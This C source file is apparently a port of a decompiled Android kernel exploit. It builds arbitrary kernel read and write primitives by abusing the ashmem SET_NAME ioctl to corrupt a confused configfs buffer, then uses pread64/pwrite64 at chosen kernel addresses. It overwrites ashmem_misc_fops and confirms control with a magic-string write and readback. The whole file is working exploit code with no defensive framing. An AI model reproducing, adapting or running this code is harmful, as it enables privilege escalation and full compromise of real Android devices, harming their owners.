#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>

#include "aar_aaw.h"
#include "diag_checkpoint.h"

#define OSS_ASHMEM_OPEN_FLAGS (O_RDWR | O_CLOEXEC) /* 0x80002, matches FUN_00105968 */
#define OSS_ASHMEM_PATH_SIZE 0x100
#define OSS_ASHMEM_NAME_LEN 0x100
#define OSS_ASHMEM_SET_NAME 0x41007701UL
#define OSS_CONFIGFS_CONTROL_LEN 0x80
#define OSS_CONFIGFS_COUNT 0x6d6873612f766564ULL /* "dev/ashm" */

/* FUN_001057e0 resolves an openable alias before exploitation and stores it
 * in the writable buffer later consumed by FUN_00105968. Android exposes a
 * boot-id alias with ashmem_libcutils_device labeling to shell callers. */
static char g_ashmem_path[OSS_ASHMEM_PATH_SIZE] = "/dev/ashmem";
static int g_ashmem_path_state;

static int select_openable_ashmem_path(const char *path) {
  int fd = open(path, OSS_ASHMEM_OPEN_FLAGS);
  if (fd < 0) {
    return 0;
  }
  close(fd);
  snprintf(g_ashmem_path, sizeof(g_ashmem_path), "%s", path);
  return 1;
}

int oss_prepare_kernel_rw_path(void) {
  if (g_ashmem_path_state != 0) {
    return g_ashmem_path_state > 0;
  }

  char boot_id[0x80];
  int boot_fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (boot_fd >= 0) {
    ssize_t n = read(boot_fd, boot_id, sizeof(boot_id) - 1);
    close(boot_fd);
    if (n > 0) {
      boot_id[n] = '\0';
      boot_id[strcspn(boot_id, "\r\n")] = '\0';
      char candidate[OSS_ASHMEM_PATH_SIZE];
      snprintf(candidate, sizeof(candidate), "/dev/ashmem%s", boot_id);
      if (select_openable_ashmem_path(candidate)) {
        g_ashmem_path_state = 1;
        return 1;
      }
    }
  }

  struct stat canonical;
  int canonical_ok = stat("/dev/ashmem", &canonical) == 0;
  DIR *dev = opendir("/dev");
  if (canonical_ok && dev && S_ISCHR(canonical.st_mode)) {
    struct dirent *entry;
    while ((entry = readdir(dev)) != NULL) {
      if (strncmp(entry->d_name, "ashmem", 6) != 0 ||
          strcmp(entry->d_name, "ashmem") == 0) {
        continue;
      }
      char candidate[OSS_ASHMEM_PATH_SIZE];
      snprintf(candidate, sizeof(candidate), "/dev/%s", entry->d_name);
      struct stat alias;
      if (stat(candidate, &alias) == 0 && S_ISCHR(alias.st_mode) &&
          alias.st_rdev == canonical.st_rdev &&
          select_openable_ashmem_path(candidate)) {
        closedir(dev);
        g_ashmem_path_state = 1;
        return 1;
      }
    }
  }
  if (dev) {
    closedir(dev);
  }

  /* The writable buffer starts as "/dev/ashmem" in the closed binary.
   * Accept that fallback only when this caller can actually open it. */
  if (canonical_ok && S_ISCHR(canonical.st_mode) &&
      select_openable_ashmem_path("/dev/ashmem")) {
    g_ashmem_path_state = 1;
    return 1;
  }

  g_ashmem_path_state = -1;
  return 0;
}

int oss_open_kernel_rw(void) {
  if (!oss_prepare_kernel_rw_path()) {
    fprintf(stderr, "[aar_aaw] no openable ashmem node\n");
    return -1;
  }
  errno = 0;
  int fd = open(g_ashmem_path, OSS_ASHMEM_OPEN_FLAGS);
  if (fd < 0) {
    int saved_errno = errno;
    fprintf(stderr, "[aar_aaw] open(%s) failed errno=%d(%s)\n",
            g_ashmem_path, saved_errno, strerror(saved_errno));
  }
  return fd;
}

/* FUN_00105e28/FUN_00105e84. ASHMEM_SET_NAME accepts a C string, while the
 * confused configfs_buffer needs embedded NUL bytes. First write every byte
 * with 0/1 mapped to 1, then replay successively shorter prefixes for each
 * intended NUL, from the end toward the start. */
static int set_name_prefix(int fd, const unsigned char *src, size_t len) {
  if (len >= OSS_ASHMEM_NAME_LEN) {
    errno = EINVAL;
    return -1;
  }
  unsigned char name[OSS_ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));
  for (size_t i = 0; i < len; i++) {
    name[i] = src[i] < 2 ? 1 : src[i];
  }
  name[len] = 0;
  return ioctl(fd, OSS_ASHMEM_SET_NAME, name);
}

static int set_ashmem_name_blob(int fd, const unsigned char *src, size_t len) {
  if (set_name_prefix(fd, src, len) != 0) {
    return -1;
  }
  for (size_t i = len; i > 0; i--) {
    if (src[i - 1] == 0 && set_name_prefix(fd, src, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

/* Smallest value >= value whose eight bytes are all nonzero. The old
 * 256-offset scan could not repair a zero in a higher byte. */
static uint64_t next_nonzero_bytes(uint64_t value) {
  for (int shift = 56; shift >= 0; shift -= 8) {
    if (((value >> shift) & 0xffU) == 0) {
      uint64_t lower = (1ULL << shift) - 1;
      return value + (1ULL << shift) - (value & lower) +
             (0x0101010101010101ULL & lower);
    }
  }
  return value;
}

int oss_kernel_read(int fd, uint64_t target_addr, void *buf, size_t len) {
  /* FUN_00107138. ashmem_area.name begins with the fixed 11-byte prefix
   * "dev/ashmem/". User-name offset 5 therefore aliases
   * configfs_buffer.page at offset 16. Pick a huge positive file position
   * whose subtraction yields a pointer with no NUL bytes, then materialize
   * the remaining zero fields through the staged SET_NAME encoder above. */
  unsigned char control[OSS_CONFIGFS_CONTROL_LEN];
  uint64_t offset = 0;
  int configured = 0;
  if (len >= OSS_CONFIGFS_COUNT) {
    errno = EOVERFLOW;
    return 0;
  }
  uint64_t base_page = target_addr - (OSS_CONFIGFS_COUNT - len);
  uint64_t page = base_page;
  for (unsigned int attempt = 0; attempt < 0x100; attempt++) {
    page = next_nonzero_bytes(page);
    uint64_t displacement = page - base_page;
    if (displacement > OSS_CONFIGFS_COUNT - len - 1) {
      break;
    }
    uint64_t candidate_offset = OSS_CONFIGFS_COUNT - len - displacement;
    memset(control, 1, sizeof(control));
    memcpy(control + 0x05, &page, sizeof(page));
    memset(control + 0x15, 0, 0x34);
    errno = 0;
    if (set_ashmem_name_blob(fd, control, sizeof(control)) == 0) {
      offset = candidate_offset;
      configured = 1;
      if (displacement >= 0x100) {
        fprintf(stderr,
                "[aar_aaw] extended read plan addr=%016llx len=%zu "
                "displacement=%llu\n",
                (unsigned long long)target_addr, len,
                (unsigned long long)displacement);
      }
      break;
    }
    if (page == UINT64_MAX) {
      break;
    }
    page++;
  }
  if (!configured) {
    errno = EOVERFLOW;
    fprintf(stderr,
            "[aar_aaw] configure read(fd=%d, addr=%016llx, len=%zu) failed "
            "errno=%d(%s)\n",
            fd, (unsigned long long)target_addr, len, errno, strerror(errno));
    return 0;
  }

  errno = 0;
  ssize_t n = pread64(fd, buf, len, (off_t)offset);
  if (n != (ssize_t)len) {
    int saved_errno = errno;
    fprintf(stderr,
            "[aar_aaw] pread64(fd=%d, addr=%016llx, len=%zu) ret=%zd errno=%d(%s)\n",
            fd, (unsigned long long)target_addr, len, n, saved_errno,
            strerror(saved_errno));
    return 0;
  }
  return 1;
}

int oss_kernel_write(int fd, uint64_t target_addr, const void *buf,
                      size_t len) {
  /* FUN_00107058. User-name offsets 0x4d/0x55/0x59 alias
   * configfs_buffer.bin_buffer/bin_buffer_size/cb_max_size. A 16-MiB-aligned
   * base plus the low 24-bit pwrite offset reaches the exact target without
   * entering configfs's allocation path. */
  uint64_t low = target_addr & 0xffffffULL;
  uint64_t end = low + len;
  if ((end >> 31) != 0) {
    errno = EOVERFLOW;
    return 0;
  }
  uint64_t high = target_addr & ~0xffffffULL;
  uint32_t end32 = (uint32_t)end;
  uint32_t zero = 0;
  unsigned char control[OSS_CONFIGFS_CONTROL_LEN];
  memset(control, 1, sizeof(control));
  memset(control + 0x15, 0, 0x38);
  memcpy(control + 0x4d, &high, sizeof(high));
  memcpy(control + 0x55, &end32, sizeof(end32));
  memcpy(control + 0x59, &zero, sizeof(zero));

  errno = 0;
  if (set_ashmem_name_blob(fd, control, sizeof(control)) != 0) {
    int saved_errno = errno;
    fprintf(stderr,
            "[aar_aaw] configure write(fd=%d, addr=%016llx, len=%zu) failed "
            "errno=%d(%s)\n",
            fd, (unsigned long long)target_addr, len, saved_errno,
            strerror(saved_errno));
    return 0;
  }

  errno = 0;
  ssize_t n = pwrite64(fd, buf, len, (off_t)low);
  if (n != (ssize_t)len) {
    int saved_errno = errno;
    fprintf(stderr,
            "[aar_aaw] pwrite64(fd=%d, addr=%016llx, len=%zu) ret=%zd errno=%d(%s)\n",
            fd, (unsigned long long)target_addr, len, n, saved_errno,
            strerror(saved_errno));
    return 0;
  }
  return 1;
}

uint64_t oss_kernel_read64(int fd, uint64_t target_addr) {
  uint64_t value = 0xffffffffffffffffULL;
  if (!oss_kernel_read(fd, target_addr, &value, sizeof(value))) {
    return 0xffffffffffffffffULL;
  }
  return value;
}

int oss_kernel_write64(int fd, uint64_t target_addr, uint64_t value) {
  return oss_kernel_write(fd, target_addr, &value, sizeof(value));
}

int oss_verify_kernel_access_ex(int fd, uint64_t ashmem_misc_fops_addr,
                                uint64_t page_base, int *landed) {
  oss_diag_checkpoint("aar-verify-start");
  uint64_t expect = page_base | 0x1180ULL;
  uint64_t got = UINT64_MAX;
  if (!oss_kernel_read(fd, ashmem_misc_fops_addr, &got, sizeof(got))) {
    return 0;
  }

  /* A fresh original ashmem fd has size zero, so its native read_iter
   * cannot return this full eight-byte kernel-address read. A full transfer
   * already proves that the global fops changed; suppress retries even if
   * the value reveals a wrong landing. */
  if (landed) {
    __atomic_store_n(landed, 1, __ATOMIC_RELEASE);
  }
  fprintf(stderr,
          "[aar_aaw] ashmem_misc_fops readback got=%016llx want=%016llx\n",
          (unsigned long long)got, (unsigned long long)expect);
  if (got != expect) {
    char stage[96];
    snprintf(stage, sizeof(stage), "aar-fops-mismatch got=%016llx want=%016llx",
             (unsigned long long)got, (unsigned long long)expect);
    oss_diag_checkpoint(stage);
    return 0;
  }
  oss_diag_checkpoint("aar-fops-verified");

  /* source: .rodata string at file offset 0x1b43 in the closed .so,
   * pulled verbatim via `r2 -qc iz` (34 chars + NUL = 35 = 0x23,
   * matches the decompile's literal length constant). */
  static const char magic[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  uint64_t scratch = page_base | 0x2180ULL;
  if (!oss_kernel_write(fd, scratch, magic, sizeof(magic))) {
    fprintf(stderr, "[aar_aaw] magic-string write failed\n");
    return 0;
  }
  oss_diag_checkpoint("aar-magic-written");
  char readback[sizeof(magic)];
  memset(readback, 0, sizeof(readback));
  if (!oss_kernel_read(fd, scratch, readback, sizeof(magic))) {
    fprintf(stderr, "[aar_aaw] magic-string readback failed\n");
    return 0;
  }
  oss_diag_checkpoint("aar-magic-read");
  if (memcmp(magic, readback, sizeof(magic)) != 0) {
    uint64_t got_prefix = 0, want_prefix = 0;
    memcpy(&got_prefix, readback, sizeof(got_prefix));
    memcpy(&want_prefix, magic, sizeof(want_prefix));
    char stage[96];
    snprintf(stage, sizeof(stage), "aar-magic-mismatch got=%016llx want=%016llx",
             (unsigned long long)got_prefix, (unsigned long long)want_prefix);
    oss_diag_checkpoint(stage);
    fprintf(stderr,
            "[aar_aaw] magic-string mismatch addr=%016llx "
            "got=%016llx want=%016llx\n",
            (unsigned long long)scratch, (unsigned long long)got_prefix,
            (unsigned long long)want_prefix);
    return 0;
  }
  fprintf(stderr, "[aar_aaw] verify ok: corruption landed, R/W primitive live\n");
  return 1;
}

int oss_verify_kernel_access(int fd, uint64_t ashmem_misc_fops_addr,
                             uint64_t page_base) {
  return oss_verify_kernel_access_ex(fd, ashmem_misc_fops_addr, page_base,
                                     NULL);
}
